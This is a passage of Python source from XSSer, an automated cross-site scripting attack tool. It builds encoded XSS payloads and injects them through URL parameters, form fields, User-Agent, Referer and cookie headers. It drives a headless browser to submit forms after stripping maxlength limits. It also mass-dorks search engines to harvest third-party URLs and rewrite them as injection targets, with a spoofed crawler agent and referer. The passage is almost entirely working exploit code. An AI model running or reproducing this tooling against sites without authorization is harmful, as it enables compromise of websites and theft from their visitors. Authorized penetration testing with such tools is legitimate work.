                tok_url = dest_url.replace("<PAYLOAD>", _e(shadow_inj))
                tok_url+= '#' + self_url
            elif 'PAYLOAD' in dest_url:
                tok_url = dest_url.replace("PAYLOAD", _e(shadow_inj))
                tok_url+= '#' + self_url
            elif 'href' in dest_url and 'PAYLOAD' in dest_url:
                tok_url = dest_url.replace('PAYLOAD', self_url)
            elif 'HREF' in dest_url and 'PAYLOAD' in dest_url:
                tok_url = dest_url.replace('PAYLOAD', self_url)
            elif 'url' in dest_url and 'PAYLOAD' in dest_url:
                tok_url = dest_url.replace('PAYLOAD', self_url)
            else:
                tok_url = dest_url + "#" + self_url
        return tok_url

    def do_token_check(self, orig_url, hashing, payload, query_string, dest_url): # searching for a [100% VULNERABLE] XSS exploit!
        tok_url = None
        tok_total = []
        if self.hash_found:
            for l in self.hash_found:
                vector_found = l[2]
                hash_found = l[3]
                if hashing in hash_found:
                    if not self.options.postdata: # GET
                        tok_url = self.generate_GET_token_payload(orig_url, dest_url, query_string, hashing, payload, vector_found)
                    else: # POST
                        tok_url = self.generate_POST_token_payload(orig_url, dest_url, query_string, hashing, payload, vector_found)
                    if tok_url:
                        self.send_token_exploit(orig_url, tok_url, hashing, vector_found)

    def generate_headless_cookies(self, orig_url): # generate cookies for internal headless browser engine
        self.driver.get(orig_url)
        r_cookies = self.driver.get_cookies() # get cookies
        if self.options.cookie:
            cookie = SimpleCookie()
            cookie.load(self.options.cookie)
            for key, morsel in cookie.items():
                for c in r_cookies:
                    if key == c["name"]:
                        c["value"] = str(morsel.value)
            for c in r_cookies:
                self.driver.add_cookie(c) # add cookies to driver

    def send_token_exploit(self, orig_url, tok_url, hashing, vector_found):
        try:
            if self.cookie_set_flag == False:
                if not self.options.postdata: # GET
                    self.generate_headless_cookies(tok_url) # send 'tok_url'
                else: # POST
                    self.generate_headless_cookies(orig_url) # send 'orig_url'
                self.cookie_set_flag = True # cookie has been set!
            if self.options.postdata: # GET + web forms scrapping + POST
                self.driver.get(orig_url) # GET request to store forms
                tok_parsed = parse_qs(tok_url)
                param_found = []
                for param_parsed in tok_parsed: # find params
                    param = self.driver.find_element_by_name(param_parsed) # by name
                    if not param:
                        param = self.driver.find_element_by_id(param_parsed) # by id
                    if param:
                        value = str(tok_parsed[param_parsed])
                        if "#http://localhost:19084/success/"+str(hashing) in value: # re-parsing injected params for POST
                            value = value.replace("#http://localhost:19084/success/"+str(hashing), "")
                        if "<SCrIpT>document.location=document.location.hash.substring(1)</ScRiPt>" in value:
                            value = value.replace("<SCrIpT>document.location=document.location.hash.substring(1)", "<SCrIpT src='http://localhost:19084/success/"+str(hashing)+"'>")
                        if "['" in value:
                            value = value.replace("['", "")
                        if "']" in value:
                            value = value.replace("']", "")
                        param.send_keys(str(value))
                        param_found.append(param)
                        max_length = param.get_attribute("maxlength")
                        if max_length: # bypass max length filters by changing DOM | black magic!
                            self.driver.execute_script("arguments[0].setAttribute('maxlength', arguments[1])", param, '9999999')
                if len(param_found) == len(tok_parsed): # form fully filled!
                    login = self.driver.find_element_by_xpath("//*[@type='submit']") # find submit by type
                    login.click() # click it!
            else: # GET
                self.driver.get(tok_url)
            if tok_url not in self.final_attacks: 
                self.final_attacks[hashing] = {'url': tok_url}
                self.token_arrived_flag = True
            else:
                self.token_arrived_flag = False
        except:
            self.token_arrived_flag = False
            if DEBUG == True:
                traceback.print_exc()

    def _report_attack_failure(self, curl_handle, dest_url, payload,\
                               query_string, orig_url):
        """
        report connection failure of an attack
        """
        options = self.options
        current_hashes = [] # to check for ongoing hashes
        if payload['browser'] == "[Heuristic test]":
            for key, value in self.hashed_injections.items():
                if str(key) in dest_url:
                    if key not in current_hashes:
                        self.final_hashes[key] = value
                        current_hashes.append(key)
        elif self.options.hash:
            for key, value in self.hashed_injections.items():
                self.final_hashes[key] = value
                current_hashes.append(key)
        else:
            self.report("-"*45)
            self.report("\n[!] Hashing: \n")
            for key, value in self.hashed_injections.items():
                if str(key) in str(dest_url):
                    if key not in current_hashes:
                        self.report(" [ " +key+" ] : [" , value + " ]")
                        self.final_hashes[key] = value
                        current_hashes.append(key)
                else:
                    if payload["browser"] == "[Data Control Protocol Injection]": # [DCP Injection]
                        b64_string = payload["payload"].split("[B64]")
                        b64_string = b64_string[1]
                        b64_string = b64_string.replace('PAYLOAD', key)
                        b64_string = b64encode(b64_string)
                        b64_string = urllib.parse.urlencode({'':b64_string})
                        if b64_string.startswith("="):
                            b64_string = b64_string.replace("=", "")
                        if str(b64_string) in str(dest_url):
                            if key not in current_hashes:
                                self.report(" [ " +key+" ] : [" , value + " ]")
                                self.final_hashes[key] = value
                                current_hashes.append(key)
                    else: # when using encoders (Str, Hex, Dec...)
                        if self.options.Str or self.options.Une or self.options.Mix or self.options.Dec or self.options.Hex or self.options.Hes or self.options.Cem:
                            if "PAYLOAD" in payload["payload"]:
                                payload_string = payload["payload"].replace("PAYLOAD", key)
                            elif "VECTOR" in payload["payload"]:
                                payload_string = payload["payload"].replace("VECTOR", key)
                            elif "XSS" in payload["payload"]:
                                payload_string = payload["payload"].replace("XSS", key)
                            elif "X1S" in payload["payload"]:
                                payload_string = payload["payload"].replace("X1S", key)
                            if self.options.Cem:
                                enc_perm = options.Cem.split(",")
                                for e in enc_perm:
                                    hashed_payload = self.encoding_permutations(payload_string)
                                    if e == "Str":
                                        hashed_payload = hashed_payload.replace(",", "%2C")
                                        dest_url = dest_url.replace(",", "%2C")
                                    if e == "Mix":
                                        hashed_payload=urllib.parse.quote(hashed_payload)
                                        dest_url = urllib.parse.quote(dest_url)
                                    if e == "Dec":
                                        hashed_payload = hashed_payload.replace("&#", "%26%23")
                                        dest_url = dest_url.replace("&#", "%26%23")
                                    if e == "Hex":
                                        hashed_payload = hashed_payload.replace("%", "%25")
                                        dest_url = dest_url.replace("%", "%25")
                                    if e == "Hes":
                                        hashed_payload = hashed_payload.replace("&#", "%26%23")
                                        hashed_payload = hashed_payload.replace(";", "%3B")
                                        dest_url = dest_url.replace("&#", "%26%23")
                                        dest_url = dest_url.replace(";", "%3B")
                            else:
                                hashed_payload = self.encoding_permutations(payload_string)
                                if self.options.Str:
                                    hashed_payload = hashed_payload.replace(",", "%2C")
                                    dest_url = dest_url.replace(",", "%2C")
                                if self.options.Mix:
                                    hashed_payload=urllib.parse.quote(hashed_payload)
                                    dest_url = urllib.parse.quote(dest_url)
                                if self.options.Dec:
                                    hashed_payload = hashed_payload.replace("&#", "%26%23")
                                    dest_url = dest_url.replace("&#", "%26%23")
                                if self.options.Hex:
                                    hashed_payload = hashed_payload.replace("%", "%25")
                                    dest_url = dest_url.replace("%", "%25")
                                if self.options.Hes:
                                    hashed_payload = hashed_payload.replace("&#", "%26%23")
                                    hashed_payload = hashed_payload.replace(";", "%3B")
                                    dest_url = dest_url.replace("&#", "%26%23")
                                    dest_url = dest_url.replace(";", "%3B")
                            if str(hashed_payload) in str(dest_url):
                                if key not in current_hashes:
                                    self.report(" [ " +key+" ] : [" , value + " ]")
                                    self.final_hashes[key] = value
                                    current_hashes.append(key)
            if self.extra_hashed_injections:
                for k, v in self.extra_hashed_injections.items():
                    payload_url = str(v[1])
                    if payload_url == payload["payload"]:
                        if k not in current_hashes:
                            self.report(" [ " +k+" ] : [" , v[0] + " ]")
                            self.final_hashes[k] = v[0]
                            current_hashes.append(k)
            self.report("\n"+"-"*45+"\n")
        if payload['browser'] == "[Heuristic test]":
            self.report("[+] Checking: " + str(payload['payload']).strip('XSS'), "\n")
        else:
            if self.extra_hashed_injections:
                extra_attacks=[]
                if options.xsa:
                    extra_attacks.append("XSA")
                if options.xsr:
                    extra_attacks.append("XSR")
                if options.coo:
                    extra_attacks.append("COO")
                if extra_attacks:
                    extra_attacks = "+ "+ str(extra_attacks)
                if options.postdata:
                    self.report("[*] Trying: " + extra_attacks + "\n\n" + orig_url.strip(), "(POST:", query_string + ") \n")
                else:
                    self.report("[*] Trying: " + extra_attacks + "\n\n" + dest_url.strip()+"\n")
            else:
                if options.postdata:
                    self.report("[*] Trying: \n\n" + orig_url.strip(), "(POST:", query_string + ")\n")
                else:
                    self.report("[*] Trying: \n\n" + dest_url.strip()+"\n")
            if not self.options.hash and not self.options.script:
                if not "XSS" in dest_url or not "X1S" in dest_url and self.options.xsa or self.options.xsr or self.options.coo:
                    pass
        if payload['browser'] == "[Heuristic test]" or payload['browser'] == "[hashed_precheck_system]" or payload['browser'] == "[manual_injection]":
            pass
        else:
            if not "XSS" in dest_url or not "X1S" in dest_url:
                if self.options.xsa or self.options.xsr or self.options.coo:
                    pass
                else:
                    self.report("-"*45)
                    self.report("\n[+] Vulnerable(s): \n\n " + payload['browser'] + "\n")
                    if not self.options.verbose:
                        self.report("-"*45 + "\n")
            else:
                self.report("-"*45)
                self.report("\n[+] Vulnerable(s): \n\n " + payload['browser'] + "\n")
                if not self.options.verbose:
                    self.report("-"*45 + "\n")
    	# statistics injections counters
        if payload['browser']=="[hashed_precheck_system]" or payload['browser']=="[Heuristic test]":
            self.check_positives = self.check_positives + 1
        elif payload['browser']=="[Data Control Protocol Injection]":
            self.dcp_injection = self.dcp_injection + 1
        elif payload['browser']=="[Document Object Model Injection]":
            self.dom_injection = self.dom_injection + 1
        elif payload['browser']=="[Induced Injection]":
            self.httpsr_injection = self.httpsr_injection + 1
        elif payload['browser']=="[manual_injection]":
            self.manual_injection = self.manual_injection + 1
        else:
            self.auto_injection = self.auto_injection +1
        if not self.hashed_injections:
            for k, v in self.extra_hashed_injections.items():
                if k in current_hashes:
                    if v[0] == "XSA":
                        agent = v[1]
                        agent = agent.replace("PAYLOAD", k)
                        Curl.agent = agent
                    if v[0] == "XSR":
                        referer = v[1]
                        referer = referer.replace("PAYLOAD", k)
                        Curl.referer = referer
                    if v[0] == "COO":
                        cookie = v[1]
                        cookie = cookie.replace("PAYLOAD", k)
                        Curl.cookie = cookie
        else:
            for key, value in self.hashed_injections.items():
                for k, v in self.extra_hashed_injections.items():
                    payload_url = v[1]
                    payload_url = payload_url.replace("PAYLOAD",key)
                    payload_url = payload_url.replace(" ", "+") # black magic!
                    final_dest_url = str(urllib.parse.unquote(dest_url.strip()))
                    if payload_url in final_dest_url:
                        if v[0] == "XSA":
                            agent = v[1]
                            agent = agent.replace("PAYLOAD", k)
                            Curl.agent = agent
                        if v[0] == "XSR":
                            referer = v[1]
                            referer = referer.replace("PAYLOAD", k)
                            Curl.referer = referer
                        if v[0] == "COO":
                            cookie = v[1]
                            cookie = cookie.replace("PAYLOAD", k)
                            Curl.cookie = cookie
                    else:
                        if k in current_hashes:
                            if v[0] == "XSA":
                                agent = v[1]
                                agent = agent.replace("PAYLOAD", k)
                                Curl.agent = agent
                            if v[0] == "XSR":
                                referer = v[1]
                                referer = referer.replace("PAYLOAD", k)
                                Curl.referer = referer
                            if v[0] == "COO":
                                cookie = v[1]
                                cookie = cookie.replace("PAYLOAD", k)
                                Curl.cookie = cookie
        if options.verbose:
            self.report("-"*45)
            self.report("\n[+] HTTP Headers Verbose:\n")
            self.report(" [Client Request]")
            Curl.print_options()
            self.report(" [Server Reply]\n")
            self.report(curl_handle.info())
        self.report("="*45)
        self.report("[*] Injection(s) Results:")
        self.report("="*45 + "\n")
        if payload['browser']=="[Heuristic test]":
            for key, value in self.final_hashes.items():
                if str(key) in dest_url:
                    heuristic_string = key
                    heuristic_param = str(payload['payload']).strip('XSS')
                    if heuristic_param == "\\":
                        self.heuris_backslash_notfound = self.heuris_backslash_notfound + 1
                    elif heuristic_param == "/":
                        self.heuris_slash_notfound = self.heuris_slash_notfound + 1
                    elif heuristic_param == ">":
                        self.heuris_mayor_notfound = self.heuris_mayor_notfound + 1
                    elif heuristic_param == "<":
                        self.heuris_minor_notfound = self.heuris_minor_notfound + 1
                    elif heuristic_param == ";":
                         self.heuris_semicolon_notfound = self.heuris_semicolon_notfound + 1
                    elif heuristic_param == "'":
                         self.heuris_colon_notfound = self.heuris_colon_notfound + 1
                    elif heuristic_param == '"':
                         self.heuris_doublecolon_notfound = self.heuris_doublecolon_notfound + 1
                    elif heuristic_param == "=":
                         self.heuris_equal_notfound = self.heuris_equal_notfound + 1
                    self.add_failure(dest_url, heuristic_param, value, query_string, orig_url, 'heuristic') # heuristic fail
        elif self.options.hash:
            for key, value in self.final_hashes.items():
                self.add_failure(dest_url, key, value, query_string, orig_url, 'hashing check') # hashing_check fail
            self.report("\n" +"="*45)
        else:
            for key, value in self.final_hashes.items():
                if "XSA" in value:
                    method = "xsa"
                    hashing = key
                elif "XSR" in value:
                    method = "xsr"
                    hashing = key
                elif "COO" in value:
                    method = "coo"
                    hashing = key
                else:
                    method = "url"
                    hashing = key
                if self.options.Str:
                    payload_string = payload["payload"].replace("PAYLOAD", key)
                    hashed_payload = self.encoding_permutations(payload_string)
                    hashed_payload = hashed_payload.replace(",", "%2C")
                    if str(hashed_payload) in str(dest_url):
                        self.add_failure(dest_url, payload, key, query_string, orig_url, value) # failed!
                elif self.options.Mix:
                    payload_string = payload["payload"].replace("PAYLOAD", key)
                    hashed_payload = self.encoding_permutations(payload_string)
                    hashed_payload=urllib.parse.quote(hashed_payload)
                    if str(hashed_payload) in str(dest_url):
                        self.add_failure(dest_url, payload, key, query_string, orig_url, value) # failed!
                elif self.options.Dec:
                    payload_string = payload["payload"].replace("PAYLOAD", key)
                    hashed_payload = self.encoding_permutations(payload_string)
                    hashed_payload = hashed_payload.replace("&#", "%26%23")
                    if str(hashed_payload) in str(dest_url):
                        self.add_failure(dest_url, payload, key, query_string, orig_url, value) # failed!
                elif self.options.Hex:
                    payload_string = payload["payload"].replace("PAYLOAD", key)
                    hashed_payload = self.encoding_permutations(payload_string)
                    hashed_payload = hashed_payload.replace("%", "%25")
                    if str(hashed_payload) in str(dest_url):
                        self.add_failure(dest_url, payload, key, query_string, orig_url, value) # failed!
                elif self.options.Hes:
                    payload_string = payload["payload"].replace("PAYLOAD", key)
                    hashed_payload = self.encoding_permutations(payload_string)
                    hashed_payload = hashed_payload.replace("&#", "%26%23")
                    hashed_payload = hashed_payload.replace(";", "%3B")
                    if str(hashed_payload) in str(dest_url):
                        self.add_failure(dest_url, payload, key, query_string, orig_url, value) # failed!
                else:
                    if self.options.Cem:
                        enc_perm = options.Cem.split(",")
                        payload_string = payload["payload"].replace("PAYLOAD", key)
                        for e in enc_perm:
                            hashed_payload = self.encoding_permutations(payload_string)
                            if str(e) == "Str":
                                hashed_payload = hashed_payload.replace(",", "%2C")
                            if e == "Mix":
                                hashed_payload=urllib.parse.quote(hashed_payload)
                            if e == "Dec":
                                hashed_payload = hashed_payload.replace("&#", "%26%23")
                            if e == "Hex":
                                hashed_payload = hashed_payload.replace("%", "%25")
                            if e == "Hes":
                                hashed_payload = hashed_payload.replace("&#", "%26%23")
                                hashed_payload = hashed_payload.replace(";", "%3B")
                        if str(hashed_payload) in str(dest_url):
                            self.add_failure(dest_url, payload, key, query_string, orig_url, value) # failed!
                    else:
                        if str(key) in str(dest_url):
                            self.add_failure(dest_url, payload, key, query_string, orig_url, value) # failed!
                        else:
                            if key in current_hashes:
                                if method == "xsa":
                                    self.add_failure(dest_url, payload, key, query_string, orig_url, "XSA") # failed!
                                elif method == "xsr":
                                    self.add_failure(dest_url, payload, key, query_string, orig_url, "XSR") # failed!
                                elif method == "coo":
                                    self.add_failure(dest_url, payload, key, query_string, orig_url, "COO") # failed!
            self.report("\n" +"="*45)
        if str(curl_handle.info()["http-code"]) == "404":
            self.report("\n[Error] 404 Not Found: The server has not found anything matching the Request-URI\n")
        elif str(curl_handle.info()["http-code"]) == "403":
            self.report("\n[Error] 403 Forbidden: The server understood the request, but is refusing to fulfill it\n")
        elif str(curl_handle.info()["http-code"]) == "400":
            self.report("\n[Error] 400 Bad Request: The request could not be understood by the server due to malformed syntax\n")
        elif str(curl_handle.info()["http-code"]) == "401":
            self.report("\n[Error] 401 Unauthorized: The request requires user authentication\n\nIf you are trying to authenticate: Login is failing!\n\ncheck:\n- authentication type is correct for the type of realm (basic, digest, gss, ntlm...)\n- credentials 'user:password' are typed correctly\n")
        elif str(curl_handle.info()["http-code"]) == "407":
            self.report("\n[Error] 407 Proxy Authentication Required: XSSer must first authenticate itself with the proxy\n")
        elif str(curl_handle.info()["http-code"]) == "408":
            self.report("\n[Error] 408 Request Timeout: XSSer did not produce a request within the time that the server was prepared to wait\n")
        elif str(curl_handle.info()["http-code"]) == "500":
            self.report("\n[Error] 500 Internal Server Error: The server encountered an unexpected condition which prevented it from fulfilling the request\n")
        elif str(curl_handle.info()["http-code"]) == "501":
            self.report("\n[Error] 501 Not Implemented: The server does not support the functionality required to fulfill the request\n")
        elif str(curl_handle.info()["http-code"]) == "502":
            self.report("\n[Error] 502 Bad Gateway: The server received an invalid response from the upstream server\n")
        elif str(curl_handle.info()["http-code"]) == "503":
            self.report("\n[Error] 503 Service Unavailable: The server is currently unable to handle the request [OFFLINE!]\n")
        elif str(curl_handle.info()["http-code"]) == "504":
            self.report("\n[Error] 504 Gateway Timeout: The server did not receive a timely response specified by the URI (try: --ignore-proxy)\n")
        elif str(curl_handle.info()["http-code"]) == "0":
            self.report("\n[Error] XSSer (or your TARGET) is not working properly...\n\n - Wrong URL\n - Firewall\n - Proxy\n - Target offline\n - [?] ...\n")
        else:
            self.report("\n[Error] Not injected!. Server responses with http-code different to: 200 OK (" + str(curl_handle.info()["http-code"]) + ")\n")
        if str(curl_handle.info()["http-code"]) == "404":
            self.not_connection = self.not_connection + 1
        elif str(curl_handle.info()["http-code"]) == "503":
            self.forwarded_connection = self.forwarded_connection + 1
        else:
            self.other_connection = self.other_connection + 1

    def check_positive(self, curl_handle, dest_url, payload, query_string):
        """
        Perform extra check for positives
        """
        body = curl_handle.body()
        pass

    def create_options(self, args=None):
        """
        Create options for OptionParser.
        """
        self.optionParser = XSSerOptions()
        self.options = self.optionParser.get_options(args)
        if not self.options:
            return False
        return self.options

    def _get_attack_urls(self):
        """
        Process payload options and make up the payload list for the attack.
        """
        urls = []
        options = self.options
        p = self.optionParser
        if options.imx:
            self.create_fake_image(options.imx, options.script)
            return []
        if options.flash:
            self.create_fake_flash(options.flash, options.script)
            return []
        if options.update:
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            try:
                print("\nTrying to update to the latest stable version...\n")
                Updater() 
            except:
                print("Not any .git repository found!\n")
                print("="*30)
                print("\nTo have working this feature, you should clone XSSer with:\n")
                print("$ git clone https://code.03c8.net/epsylon/xsser\n")
                print("\nAlso you can try this other mirror:\n")
                print("$ git clone https://github.com/epsylon/xsser\n")
            return []
        if options.wizard: # processing wizard template
           if self.user_template is not None:
               self.options.statistics = True # detailed output
               if self.user_template[0] == "DORKING": # mass-dorking
                   self.options.dork_file = True
                   self.options.dork_mass = True
               elif "http" in self.user_template[0]: # from target url
                   self.options.url = self.user_template[0]
               else: # from file
                   self.options.readfile = self.user_template[0]
               if self.user_template[1] == "CRAWLER": # crawlering target
                   self.options.crawling = "10"
               else: # manual payload (GET or POST)
                   if self.user_template_conntype == "GET":
                       self.options.getdata = self.user_template[1]
                   else:
                       self.options.postdata = self.user_template[1]
               if self.user_template[2] == "Proxy: No - Spoofing: Yes":
                   self.options.ignoreproxy = True
                   self.options.agent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search" # spoof agent
                   self.options.referer = "127.0.0.1" # spoof referer
               elif self.user_template[2] == "Proxy: No - Spoofing: No":
                   self.options.ignoreproxy = True
               else: # using proxy + spoofing
                   self.options.agent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search" # spoof agent
                   self.options.referer = "127.0.0.1" # spoof referer
                   if self.user_template[2] is not None:
                       self.options.proxy = self.user_template[2]
                   else:
                       self.options.ignoreproxy = True
               if self.user_template[3] == "Not using encoders":
                   pass
               elif self.user_template[3] == "Hex": # Hexadecimal
                   self.options.Hex = True
               elif self.user_template[3] == "Str+Une": # StringFromCharCode()+Unescape()
                   self.options.Str = True
                   self.options.Une = True
               else: # Character encoding mutations
                   self.options.Cem = self.user_template[3]
               if self.user_template[4] == "Alertbox": # Classic AlertBox injection
                   self.options.finalpayload = "<script>alert('XSS');</script>"
               else:
                   if self.user_template[4] is not None: # Inject user script
                       self.options.finalpayload = self.user_template[4]
                   else: # not final injection
                       pass 
           else: # exit
               return
        if options.target: # miau!
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [Full XSS audit]... ;-)")
            self.report('='*75)
            self.report("\n[Info] The following actions will be performed at the end:\n")
            self.report("  1- Output with detailed statistics\n")
            self.report("  2- Export results to files: \n\n     - a) XSSreport.raw \n     - b) XSSer_<target>_<datetime>.xml\n")
            self.options.crawling = 99999 # set max num of urls to crawl
            self.options.crawler_width = 5 # set max num of deeping levels
            self.options.crawler_local = True # set crawlering range to local only
            self.options.statistics = True # detailed output
            self.options.timeout = 60 # timeout
            self.options.retries = 2 # retries  
            self.options.delay = 5 # delay
            self.options.threads = 10 # threads
            self.options.followred = True # follow redirs
            self.options.nohead = False # HEAD check
            self.options.reversecheck = True # try to establish a reverse connection 
            self.options.fuzz = True # autofuzzing 
            self.options.coo = True # COO
            self.options.xsa = True # XSA
            self.options.xsr = True # XSR
            self.options.dcp = True # DCP
            self.options.dom = True # DOM
            self.options.inducedcode = True # Induced
            self.options.fileoutput = True # Important: export results to file (.raw)
            self.options.filexml = "XSSer_" + str(self.options.target) + "_" + str(datetime.datetime.now())+".xml" # export xml
            self.check_trace() # XST
            urls = [options.target]
        if options.url:
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            if self.options.crawling:
                self.report("Testing [XSS from CRAWLER]...")
            else:
                self.report("Testing [XSS from URL]...")
            self.report('='*75)
            urls = [options.url]
        elif options.readfile:
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [XSS from FILE]...")
            self.report('='*75)
            try:
                f = open(options.readfile)
                urls = f.readlines()
                urls = [ line.replace('\n','') for line in urls ]
                f.close()
            except:
                import os.path
                if os.path.exists(options.readfile) == True:
                    self.report('\nThere are some errors opening the file: ', options.readfile, "\n")
                else:
                    self.report('\nCannot found file: ', options.readfile, "\n")
        elif options.dork: # dork a query
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [XSS from DORK]... Good luck! ;-)")
            self.report('='*75)
            if options.dork_mass: # massive dorkering
                for e in self.search_engines:
                    try:
                        dorker = Dorker(e)
                        urls = dorker.dork(options.dork)
                        i = 0
                        for u in urls: # replace original parameter for injection keyword (XSS)
                            p_uri = urlparse(u)
                            uri = p_uri.netloc
                            path = p_uri.path
                            target_params = parse_qs(urlparse(u).query, keep_blank_values=True)
                            for key, value in target_params.items(): # parse params to apply keywords
                                for v in value:
                                    target_params[key] = 'XSS'
                            target_url_params = urllib.parse.urlencode(target_params)
                            u = p_uri.scheme + "://" + uri + path + "?" + target_url_params
                            urls[i] = u
                            i = i + 1
                    except Exception as e:
                        for reporter in self._reporters:
                            reporter.mosquito_crashed(dorker.search_url, str(e.message))
                    else:
                        if urls is not None:
                           for url in urls:
                                for reporter in self._reporters:
                                    reporter.add_link(dorker.search_url, url)
            else:
                if not options.dork_engine:
                    options.dork_engine = 'duck' # default search engine [26-08/2019]
                dorker = Dorker(options.dork_engine)
                try:
                    urls = dorker.dork(options.dork)
                    i = 0
                    for u in urls: # replace original parameter for injection keyword (XSS)
                        p_uri = urlparse(u)
                        uri = p_uri.netloc
                        path = p_uri.path
                        target_params = parse_qs(urlparse(u).query, keep_blank_values=True)
                        for key, value in target_params.items(): # parse params to apply keywords
                            for v in value:
                                target_params[key] = 'XSS'
                        target_url_params = urllib.parse.urlencode(target_params)
                        u = p_uri.scheme + "://" + uri + path + "?" + target_url_params
                        urls[i] = u
                        i = i + 1
                except Exception as e:
                    for reporter in self._reporters:
                        reporter.mosquito_crashed(dorker.search_url, str(e.message))
                else:
                    if urls is not None:
                        for url in urls:
                            for reporter in self._reporters:
                                reporter.add_link(dorker.search_url, url)

        elif options.dork_file: # dork from file ('core/fuzzing/dorks.txt')
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [XSS from DORK]... Good luck! ;-)")
            self.report('='*75)
            try:
                f = open('core/fuzzing/dorks.txt')
                dorks = f.readlines()
                dorks = [ dork.replace('\n','') for dork in dorks ]
                f.close()
                if not dorks:
                    print("\n[Error] - Imposible to retrieve 'dorks' from file.\n")
                    return
            except:
                if os.path.exists('core/fuzzing/dorks.txt') == True:
                    print('[Error] - Cannot open:', 'dorks.txt', "\n")
                    return 
                else:
                    print('[Error] - Cannot found:', 'dorks.txt', "\n")
                    return
            if not options.dork_engine:
                options.dork_engine = 'duck' # default search engine [26-08/2019]
            if options.dork_mass: # massive dorkering
                for e in self.search_engines:
                    try:
                        dorker = Dorker(e)
                        for dork in dorks:
                            urls = dorker.dork(dork)
                        i = 0
                        for u in urls: # replace original parameter for injection keyword (XSS)
                            p_uri = urlparse(u)
                            uri = p_uri.netloc
                            path = p_uri.path
                            target_params = parse_qs(urlparse(u).query, keep_blank_values=True)
                            for key, value in target_params.items(): # parse params to apply keywords
                                for v in value:
                                    target_params[key] = 'XSS'
                            target_url_params = urllib.parse.urlencode(target_params)
                            u = p_uri.scheme + "://" + uri + path + "?" + target_url_params
                            urls[i] = u
                            i = i + 1
                    except Exception as e:
                        for reporter in self._reporters:
                            reporter.mosquito_crashed(dorker.search_url, str(e.message))
                    else:
                        if urls is not None:
                            for url in urls:
                                for reporter in self._reporters:
                                    reporter.add_link(dorker.search_url, url)
            else:
                dorker = Dorker(options.dork_engine)
                try:
                    for dork in dorks:
                        urls = dorker.dork(dork)
                    i = 0
                    for u in urls: # replace original parameter for injection keyword (XSS)
                        p_uri = urlparse(u)
                        uri = p_uri.netloc
                        path = p_uri.path
                        target_params = parse_qs(urlparse(u).query, keep_blank_values=True)
                        for key, value in target_params.items(): # parse params to apply keywords
                            for v in value:
                                target_params[key] = 'XSS'
                        target_url_params = urllib.parse.urlencode(target_params)
                        u = p_uri.scheme + "://" + uri + path + "?" + target_url_params
                        urls[i] = u
                        i = i + 1
                except Exception as e:
                    for reporter in self._reporters:
                        reporter.mosquito_crashed(dorker.search_url, str(e.message))
                else:
                    if urls is not None:
                        for url in urls:
                            for reporter in self._reporters:
                                reporter.add_link(dorker.search_url, url)
        if options.crawling: # crawlering target(s)
            nthreads = options.threads
            self.crawled_urls = list(urls)
            all_crawled = []
            try:
                self.options.crawling = int(self.options.crawling)
            except:
                self.options.crawling = 50
            if self.options.crawler_width == None:
                self.options.crawler_width = 2 # default crawlering-width
            else:
                try:
                    self.options.crawler_width = int(self.options.crawler_width)
                except:
                    self.options.crawler_width = 2 # default crawlering-width
            if self.options.crawler_local == None:
                self.options.crawler_local = False # default crawlering to LOCAL
            if self.options.crawling > 100:
                warning_text = " -> (WARNING: It can take long time...)"
            else:
                warning_text = ""
            for url in set(urls):
                self.report("\n[Info] Crawlering TARGET:", url, "\n\n   - Max. limit: "+ str(self.options.crawling)+warning_text+ " \n   - Deep level: "+ str(options.crawler_width))
            crawler = Crawler(self, Curl, all_crawled,
                              self.pool)
            crawler.set_reporter(self)
            # now wait for all results to arrive
            while urls:
                self.run_crawl(crawler, urls.pop(), options)
            while not self._landing:
                for reporter in self._reporters:
                    reporter.report_state('broad scanning')
                try:
                    self.pool.poll()
                except NoResultsPending:
                    crawler.cancel()
                    break
                if len(self.crawled_urls) >= int(options.crawling) or not crawler._requests:
                    self.report("\n[Info] Found enough results... calling all mosquitoes to home!")
                    crawler.cancel()
                    break
                time.sleep(0.1)
            # re-parse crawled urls from main
            parsed_crawled_urls = []
            for u in self.crawled_urls:
                if "XSS" in u:
                    parsed_crawled_urls.append(u)
                else:
                    pass
            self.crawled_urls = parsed_crawled_urls
            # report parsed crawled urls
            self.report("\n" + "-"*25)
            self.report("\n[Info] Mosquitoes have found: [ " + str(len(self.crawled_urls)) + " ] possible attacking vector(s)")
            if self.crawled_urls:
                self.report("")
                for u in self.crawled_urls:
                    if '/XSS' in u:
                        u = u.replace("/XSS", "")
                    self.report("   - " + str(u))
            if not len(self.crawled_urls) > 0:
                self.report("\n" + "-"*25)
                self.report("\n[Error] XSSer (or your TARGET) is not working properly...\n\n - Wrong URL\n - Firewall\n - Proxy\n - Target offline\n - [?] ...\n")
            else:
                self.report("")
            return self.crawled_urls

        if not options.imx or not options.flash or not options.xsser_gtk or not options.update:
            return urls
            
    def run_crawl(self, crawler, url, options):
        def _cb(request, result):
            pass

        def _error_cb(request, error):
            for reporter in self._reporters:
                reporter.mosquito_crashed(url, str(error[0]))
            if DEBUG == True:
                traceback.print_tb(error[2])

        def crawler_main(args):
            return crawler.crawl(*args)
        crawler.crawl(url, int(options.crawler_width),
                      int(options.crawling),options.crawler_local)
        
    def poll_workers(self):
        try:
            self.pool.poll()
        except NoResultsPending:
            pass

    def try_running(self, func, error, args=[]):
        """
        Try running a function and print some error if it fails and exists with
        a fatal error.
        """
        try:
            return func(*args)
        except Exception as e:
            self.report(error)
            if DEBUG == True:
                traceback.print_exc()
 
    def check_trace(self):
        """
        Check for Cross Site Tracing (XST) vulnerability: 
            1) check HTTP TRACE method enabled (add 'Max-Forwards: 0' to curl command to bypass some 'Anti-antixst' web proxy rules) 
            2) check data sent on reply 
        """
        agents = [] # user-agents
        try:
            f = open("core/fuzzing/user-agents.txt").readlines() # set path for user-agents
        except:
            f = open("fuzzing/user-agents.txt").readlines() # set path for user-agents when testing
        for line in f:
            agents.append(line)
        agent = random.choice(agents).strip() # set random user-agent
        referer = '127.0.0.1'
        import subprocess, shlex
        if not self.options.xst:
            self.report("-"*25 + "\n")
        self.report("[Info] REQUEST: Cross Site Tracing (XST) Vulnerability...\n")
